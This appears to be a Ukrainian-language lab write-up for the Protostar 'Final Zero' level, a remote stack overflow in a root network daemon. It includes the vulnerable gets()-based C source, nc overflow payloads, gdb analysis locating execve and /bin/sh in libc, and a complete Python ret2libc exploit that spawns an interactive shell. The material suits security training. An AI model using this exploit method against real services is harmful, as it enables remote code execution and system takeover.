## [Final Zero](http://exploit.education/protostar/final-zero/)

Даний рівень поєднує переповнення стека та мережеве програмування для віддаленого переповнення.

Переходимо у директорію із завданням:  
```cd /opt/protostar/bin/```

Вихідний код:  
```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```

Щоб перевірити як працює код можна ввести наступну команду:  
```nc 127.0.0.1 2995```  
 
Передамо у програму замість username дані, які викличуть переповнення буфера:  
python -c "print('a' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffffgggg')" | nc 127.0.0.1 2995

Після цього у директорії /tmp/ має згенеруватися дамп ядра. Завантажимо його та перевіримо стан регістрів:  
```
gdb final0 /tmp/core.11.final0.1638
...
info registers
x/32wx $esp-8
```

Регістр ```EBP``` має значення ```0x66656565``` що відповідає 'eeeef' у реверсі.
Отже, для перезапису адреси повернення нам необхідно передати програмі 'a' * 510 + '\x00' + 'aaaabbbbccccddddeeeef' (532 байти).

```
python -c "print('a' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffffgggg')" | nc 127.0.0.1 2995
...
pidof final0
cat /proc/1425/maps
gdb -p `pidof final0`
c
set follow-fork-mode child
c
python -c "print('a' * 510 + '\x00' + 'aaaabbbbccccddddeeeeffffgggg')" | nc 127.0.0.1 2995 # у іншій консолі 
r
c
q
```
  
```
gdb -p `pidof final0`
info functions @plt
# 0x08048c0c
```
![execve](execve.png)

Отже, маємо ```0x08048c0c```

```
pidof final0
# 1425
cat /proc/1425/maps
# b7e97000 - навпроти /lib/libc-2.11.2.so
```

![/lib/libc](lib_libc.png)

```
grep -R -a -b -o /bin/sh /lib/libc.so.6
#1176511:/bin/sh
```

![/bin/sh](bin_sh.png)

Маючи усі необхідні дані можемо писати код експлойту:  
```nano exploit.py```  

```python
import struct
import socket
import telnetlib

HOST = '127.0.0.1'
PORT = 2995

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

padding = 'a' * 510 + '\x00' + 'aaaabbbbccccddddeeeef'
execve = struct.pack('I', 0x08048c0c)
binsh = struct.pack('I', 1176511 + 0xb7e97000)

exploit = padding + execve + 'AAAA' + binsh + '\x00' * 8

s.send(exploit + '\n')
s.send('id\n')
print(s.recv(1024))

s.send('uname -a \n')
print(s.recv(1024))

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Запускаємо експлойт і все готово:  
```python exploit.py```

![Shell test](shell_test.png)